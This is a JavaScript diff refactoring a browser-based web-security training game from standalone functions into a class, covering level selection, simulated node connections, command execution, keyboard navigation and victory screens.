-  if (sessionNode) sessionNode.status = "healthy"
-
-  renderNetworkMap()
-  saveLevelProgress()
-  checkLevelComplete()
-}
-
-// Disconnect from Node
-function disconnectNode() {
-  const node = gameState.networkNodes.find((n) => n.id === gameState.currentNode)
-  addTerminalLine("logout", "")
-  addTerminalLine(`Disconnected from ${node.hostname}`, "info")
-  addTerminalLine("---", "")
-
-  gameState.currentNode = null
-  updateNPCPanel(null)
-  renderNetworkMap()
-  renderCommands()
-}
-
-// Talk to NPC
-function talkToNPC() {
-  const node = gameState.networkNodes.find((n) => n.id === gameState.currentNode)
-
-  if (!node || !node.npc) {
-    return
-  }
-
-  showDialog(node.npc.name, node.npc.dialog)
-}
-
-// Show Dialog
-function showDialog(npcName, message) {
-  dialogNPC.textContent = npcName
-  dialogBody.textContent = message
-  dialogModal.classList.add("show")
-}
-
-// Close Dialog
-function closeDialog() {
-  dialogModal.classList.remove("show")
-}
-
-// Check if Level is Complete
-function checkLevelComplete() {
-  const allVulnsFixed = gameState.currentLevel.vulnerabilities.every((v) =>
-    gameState.vulnerabilitiesFixed.has(v),
-  )
-
-  if (allVulnsFixed) {
-    setTimeout(() => {
-      showVictory()
-    }, 1000)
-  }
-}
-
-// Show Victory
-function showVictory() {
-  gameState.completedLevels.add(gameState.currentLevel.id)
-
-  // Save progress and clear level-specific progress
-  saveGameState()
-  clearLevelProgress(gameState.currentLevel.id)
-
-  const victoryMessage = document.getElementById("victory-message")
-  const nextLevelButton = document.getElementById("next-level")
-
-  // Clear previous content safely
-  victoryMessage.textContent = ""
-
-  // Create greeting
-  const greetingText = document.createElement("p")
-  const greetingStrong = document.createElement("strong")
-  greetingStrong.textContent = "Excellent work, Security Engineer!"
-  greetingText.appendChild(greetingStrong)
-  victoryMessage.appendChild(greetingText)
-
-  // Create level name
-  const levelText = document.createElement("p")
-  levelText.textContent = "You successfully completed: "
-  const levelName = document.createElement("strong")
-  levelName.textContent = gameState.currentLevel.name
-  levelText.appendChild(levelName)
-  victoryMessage.appendChild(levelText)
-
-  // Create concepts learned section
-  const conceptsHeading = document.createElement("p")
-  const conceptsStrong = document.createElement("strong")
-  conceptsStrong.textContent = "What you learned:"
-  conceptsHeading.appendChild(conceptsStrong)
-  victoryMessage.appendChild(conceptsHeading)
-
-  const conceptsList = document.createElement("ul")
-  conceptsList.style.textAlign = "left"
-  conceptsList.style.display = "inline-block"
-
-  gameState.currentLevel.concepts.forEach((concept) => {
-    const li = document.createElement("li")
-    li.textContent = concept
-    conceptsList.appendChild(li)
-  })
-  victoryMessage.appendChild(conceptsList)
-
-  // Create vulnerabilities section
-  const vulnHeading = document.createElement("p")
-  const vulnStrong = document.createElement("strong")
-  vulnStrong.textContent = "Vulnerabilities Fixed:"
-  vulnHeading.appendChild(vulnStrong)
-  victoryMessage.appendChild(vulnHeading)
-
-  const vulnList = document.createElement("ul")
-  vulnList.style.textAlign = "left"
-  vulnList.style.display = "inline-block"
-
-  gameState.currentLevel.vulnerabilities.forEach((v) => {
-    const li = document.createElement("li")
-    li.textContent = `✅ ${v.replace(/_/g, " ").toUpperCase()}`
-    vulnList.appendChild(li)
-  })
-  victoryMessage.appendChild(vulnList)
-
-  // Add learning resources if available
-  if (gameState.currentLevel.resources && gameState.currentLevel.resources.length > 0) {
-    const resourcesHeading = document.createElement("p")
-    const resourcesStrong = document.createElement("strong")
-    resourcesStrong.textContent = "📚 Learn More:"
-    resourcesHeading.appendChild(resourcesStrong)
-    resourcesHeading.style.marginTop = "20px"
-    victoryMessage.appendChild(resourcesHeading)
-
-    const resourcesList = document.createElement("ul")
-    resourcesList.style.textAlign = "left"
-    resourcesList.style.display = "inline-block"
-
-    gameState.currentLevel.resources.forEach((resource) => {
-      const li = document.createElement("li")
-      const link = document.createElement("a")
-      link.href = resource.url
-      link.target = "_blank"
-      link.rel = "noopener noreferrer"
-      link.textContent = resource.title
-      link.style.color = "var(--accent-blue)"
-      link.style.textDecoration = "none"
-      li.appendChild(link)
-      resourcesList.appendChild(li)
     })
-    victoryMessage.appendChild(resourcesList)
+
+    // Command button clicks (delegated)
+    elements.availableCommandsEl.addEventListener("click", (e) => {
+      const button = e.target.closest(".command-button")
+      if (button && !button.disabled) {
+        const commandId = button.dataset.commandId
+        this.executeCommand(commandId)
+      }
+    })
   }
 
-  // Check if there's a next level
-  const currentLevelIndex = LEVEL_ORDER.indexOf(gameState.currentLevel.id)
-  const hasNextLevel = currentLevelIndex < LEVEL_ORDER.length - 1
+  /**
+   * Setup keyboard navigation
+   */
+  setupKeyboardNavigation() {
+    document.addEventListener("keydown", (e) => {
+      // Escape - close modals
+      if (e.key === "Escape") {
+        if (this.gameUI.elements.dialogModal.classList.contains("show")) {
+          this.npcManager.closeDialog()
+          return
+        }
+        if (this.gameUI.elements.victoryModal.classList.contains("show")) {
+          this.showLevelSelection()
+          return
+        }
+        if (this.gameUI.elements.toolModal.classList.contains("show")) {
+          this.gameUI.closeTool()
+          return
+        }
+      }
 
-  if (hasNextLevel) {
-    const nextLevelText = document.createElement("p")
-    nextLevelText.textContent = "Ready for the next challenge?"
-    victoryMessage.appendChild(nextLevelText)
-    nextLevelButton.style.display = "inline-block"
-  } else {
-    const congratsText = document.createElement("p")
-    const congratsStrong = document.createElement("strong")
-    congratsStrong.textContent = "🎉 Congratulations! You've completed all levels!"
-    congratsText.appendChild(congratsStrong)
-    victoryMessage.appendChild(congratsText)
+      // Enter - activate focused element
+      if (e.key === "Enter") {
+        const focused = document.activeElement
 
-    const masteryText = document.createElement("p")
-    masteryText.textContent = "You've mastered the fundamentals of web security!"
-    victoryMessage.appendChild(masteryText)
+        // Level card selection
+        if (focused.classList.contains("level-card") && !focused.classList.contains("locked")) {
+          focused.click()
+          return
+        }
 
-    nextLevelButton.style.display = "none"
+        // Command button activation
+        if (focused.classList.contains("command-button") && !focused.disabled) {
+          focused.click()
+          return
+        }
+
+        // Network node selection
+        if (focused.classList.contains("network-node")) {
+          focused.click()
+          return
+        }
+      }
+
+      // Arrow keys - navigate level cards when on level selection screen
+      if (this.gameUI.elements.levelSelectionEl.style.display !== "none") {
+        const levelCards = Array.from(document.querySelectorAll(".level-card:not(.locked)"))
+        const currentIndex = levelCards.indexOf(document.activeElement)
+
+        if (e.key === "ArrowRight" && currentIndex >= 0 && currentIndex < levelCards.length - 1) {
+          levelCards[currentIndex + 1].focus()
+          e.preventDefault()
+        } else if (e.key === "ArrowLeft" && currentIndex > 0) {
+          levelCards[currentIndex - 1].focus()
+          e.preventDefault()
+        } else if (
+          (e.key === "ArrowRight" || e.key === "ArrowDown") &&
+          currentIndex === -1 &&
+          levelCards.length > 0
+        ) {
+          // No card focused, focus first one
+          levelCards[0].focus()
+          e.preventDefault()
+        }
+      }
+
+      // Arrow keys - navigate network nodes when in game
+      if (this.gameUI.elements.gameScreenEl.style.display !== "none") {
+        const nodes = Array.from(document.querySelectorAll(".network-node"))
+        const currentIndex = nodes.indexOf(document.activeElement)
+
+        if (e.key === "ArrowDown" && currentIndex >= 0 && currentIndex < nodes.length - 1) {
+          nodes[currentIndex + 1].focus()
+          e.preventDefault()
+        } else if (e.key === "ArrowUp" && currentIndex > 0) {
+          nodes[currentIndex - 1].focus()
+          e.preventDefault()
+        } else if (
+          (e.key === "ArrowDown" || e.key === "ArrowRight") &&
+          currentIndex === -1 &&
+          nodes.length > 0
+        ) {
+          // No node focused, focus first one
+          nodes[0].focus()
+          e.preventDefault()
+        }
+      }
+    })
   }
 
-  victoryModal.classList.add("show")
-}
-
-// Go to Next Level
-function goToNextLevel() {
-  victoryModal.classList.remove("show")
-  const currentLevelIndex = LEVEL_ORDER.indexOf(gameState.currentLevel.id)
-  const nextLevelId = LEVEL_ORDER[currentLevelIndex + 1]
-  startLevel(nextLevelId)
-}
-
-// Add Terminal Line
-function addTerminalLine(text, className = "") {
-  const line = document.createElement("div")
-  line.className = `terminal-line ${className}`
-  if (className === "command") {
-    // Commands get a prompt prefix
-    line.innerHTML = `<span style="color: var(--accent-blue)">$ </span>${text}`
-  } else {
-    line.textContent = text
+  /**
+   * Show level selection screen
+   */
+  showLevelSelection() {
+    this.gameUI.showLevelSelection()
+    this.gameUI.renderLevelList(this.gameState)
   }
-  terminalOutputEl.appendChild(line)
+
+  /**
+   * Start a level
+   * @param {string} levelId - Level identifier
+   */
+  startLevel(levelId) {
+    this.gameState.enterLevel(levelId)
+
+    this.gameUI.showGameScreen()
+
+    const hasProgress =
+      this.gameState.cluesFound.size > 0 || this.gameState.vulnerabilitiesFixed.size > 0
+    this.gameUI.initializeLevelScreen(this.gameState.currentLevel, hasProgress)
+
+    this.updateProgressInfo()
+    this.gameUI.renderNetworkMap(this.gameState.networkNodes, this.gameState.currentNode)
+    this.renderCommands()
+  }
+
+  /**
+   * Select (connect to) a network node
+   * @param {string} nodeId - Node identifier
+   */
+  selectNode(nodeId) {
+    const node = this.gameState.getNodeById(nodeId)
+    const wasConnected = this.gameState.currentNode !== null
+
+    // If already connected to a different node, disconnect first
+    if (wasConnected && this.gameState.currentNode !== nodeId) {
+      this.gameUI.addTerminalLine("", "")
+      this.gameUI.addTerminalLine("Connection closed.", "info")
+      this.gameUI.addTerminalLine("---", "")
+    }
+
+    this.gameState.selectNode(nodeId)
+
+    // SSH connection message
+    this.gameUI.addTerminalLine(`ssh user@${node.hostname}`, "command")
+    this.gameUI.addTerminalLine(`Connected to ${node.hostname}`, "info")
+    this.gameUI.addTerminalLine(
+      `System load: ${node.systemLoad || "0.15"}  Memory: ${node.memoryUsage || "42"}%`,
+      "info",
+    )
+    this.gameUI.addTerminalLine("", "")
+
+    this.gameUI.updateNPCPanel(node)
+    this.gameUI.renderNetworkMap(this.gameState.networkNodes, this.gameState.currentNode)
+    this.renderCommands()
+    this.gameUI.scrollTerminalToBottom()
+  }
+
+  /**
+   * Execute a command
+   * @param {string} commandId - Command identifier
+   */
+  executeCommand(commandId) {
+    this.commandHandler.executeCommand(commandId)
+    this.updateProgressInfo()
+    this.renderCommands()
+    this.gameUI.renderNetworkMap(this.gameState.networkNodes, this.gameState.currentNode)
+    this.checkLevelComplete()
+  }
+
+  /**
+   * Render available commands
+   */
+  renderCommands() {
+    const commands = this.commandHandler.getAvailableCommands()
+    this.gameUI.renderCommands(commands)
+  }
+
+  /**
+   * Update progress information display
+   */
+  updateProgressInfo() {
+    const cluesFound = this.gameState.cluesFound.size
+    const totalClues = this.gameState.currentLevel.requiredClues.length
+    const vulnsFixed = this.gameState.vulnerabilitiesFixed.size
+    const totalVulns = this.gameState.currentLevel.vulnerabilities.length
+
+    this.gameUI.updateProgressInfo(cluesFound, totalClues, vulnsFixed, totalVulns)
+  }
+
+  /**
+   * Check if level is complete
+   */
+  checkLevelComplete() {
+    if (this.gameState.isLevelComplete()) {
+      setTimeout(() => {
+        this.showVictory()
+      }, 1000)
+    }
+  }
+
+  /**
+   * Show victory modal
+   */
+  showVictory() {
+    this.gameState.completeLevel()
+    const hasNextLevel = this.gameState.hasNextLevel()
+    this.gameUI.showVictory(this.gameState.currentLevel, hasNextLevel)
+  }
+
+  /**
+   * Go to next level
+   */
+  goToNextLevel() {
+    this.gameUI.closeVictory()
+    const nextLevelId = this.gameState.getNextLevelId()
+    if (nextLevelId) {
+      this.startLevel(nextLevelId)
+    }
+  }
+
+  /**
+   * Reset all progress
+   */
+  resetProgress() {
+    if (
+      confirm("⚠️ Reset all progress?\n\nThis will delete your save data and cannot be undone.")
+    ) {
+      this.gameState.resetProgress()
+      this.gameUI.renderLevelList(this.gameState)
+      this.gameUI.addTerminalLine("Progress reset successfully.", "success")
+    }
+  }
 }
 
-// Scroll Terminal to Bottom
-function scrollTerminalToBottom() {
-  terminalOutputEl.scrollTop = terminalOutputEl.scrollHeight
-}
-
-// Start the game
-init()
+// Initialize game when DOM is ready
+document.addEventListener("DOMContentLoaded", () => {
+  window.game = new NetGuardGame()
+})
